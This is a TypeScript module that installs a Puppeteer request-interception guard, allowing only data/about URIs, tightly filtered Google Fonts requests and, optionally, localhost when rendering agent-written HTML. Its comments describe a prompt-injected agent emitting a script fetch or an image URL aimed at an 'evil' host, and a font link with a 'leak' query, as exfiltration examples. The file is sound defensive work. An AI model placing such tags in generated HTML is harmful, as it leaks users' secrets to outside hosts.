/**
 * Network guard for puppeteer pages rendering agent-authored HTML.
 *
 * The agent that composes a Maket document is semi-trusted: a prompt-injected
 * brief can produce HTML containing `<script>fetch('https://evil/')...</script>`
 * or an `<img src="https://evil/?leak=…">`. When that HTML is rendered to PDF
 * or screenshotted by puppeteer, every outbound request resolves through the
 * Chromium that runs as the local user — so the agent's exfiltration succeeds.
 *
 * `installNetworkGuard(page, mode)` neutralises this:
 *
 *  - `mode: "offline"` — only `data:`/`about:` URIs and a strict subset of
 *    Google Fonts CDN requests succeed. Use for paths that inline their assets
 *    (PDF, thumbnail) but still need charte-declared web fonts so measured
 *    metrics match the live preview. Misnamed historically — it's "offline
 *    except inert font CDN", not strictly offline.
 *  - `mode: "localhost-only"` — same as offline, plus requests to `127.0.0.1`
 *    or `localhost`. Use for paths that legitimately fetch from the Maket
 *    HTTP server (layout check, preview snapshot).
 *
 * Google Fonts is allowed in both modes because `charteFontImport` emits
 * `@import url('https://fonts.googleapis.com/...')` for every charte-declared
 * family. Blocking the CDN made headless renders fall back to
 * `serif`/`sans-serif`/`monospace` — the layout check then measured with the
 * wrong metrics and returned "Layout OK" on pages that overflowed in the
 * user's browser. Allowing only known-good font endpoints keeps that benefit
 * without widening the exfiltration surface — see `isAllowedFontRequest`.
 */

import type { HTTPRequest, Page } from "puppeteer";

export type NetworkGuardMode = "offline" | "localhost-only";

const LOCAL_HOSTNAMES = new Set(["localhost", "127.0.0.1", "::1"]);

// Path + query allowlist for Google Fonts. Without these, an agent-authored
// `<link href="https://fonts.googleapis.com/css2?family=Inter&leak={{secret}}">`
// would round-trip through Google's access logs — narrow exfil vector but
// real, since the hostname check alone admits any URL.
const GOOGLEAPIS_PATHS = new Set(["/css", "/css2"]);
const GOOGLEAPIS_QUERY_KEYS = new Set([
	"family",
	"display",
	"subset",
	"text",
	"effect",
]);

function isAllowedFontRequest(u: URL, hostname: string): boolean {
	if (hostname === "fonts.googleapis.com") {
		if (!GOOGLEAPIS_PATHS.has(u.pathname)) return false;
		for (const key of u.searchParams.keys()) {
			if (!GOOGLEAPIS_QUERY_KEYS.has(key)) return false;
		}
		return true;
	}
	if (hostname === "fonts.gstatic.com") {
		if (!u.pathname.startsWith("/s/")) return false;
		if (u.search !== "") return false;
		return true;
	}
	return false;
}

export async function installNetworkGuard(
	page: Page,
	mode: NetworkGuardMode,
): Promise<void> {
	await page.setRequestInterception(true);
	page.on("request", (req) => {
		handleGuardedRequest(req, mode);
	});
}

function handleGuardedRequest(req: HTTPRequest, mode: NetworkGuardMode): void {
	const url = req.url();
	if (url.startsWith("data:") || url.startsWith("about:")) {
		req.continue().catch(() => {});
		return;
	}
	try {
		const u = new URL(url);
		if (u.protocol === "http:" || u.protocol === "https:") {
			const hostname = u.hostname.toLowerCase();
			if (isAllowedFontRequest(u, hostname)) {
				req.continue().catch(() => {});
				return;
			}
			if (mode === "localhost-only" && LOCAL_HOSTNAMES.has(hostname)) {
				req.continue().catch(() => {});
				return;
			}
		}
	} catch {}
	req.abort("blockedbyclient").catch(() => {});
}
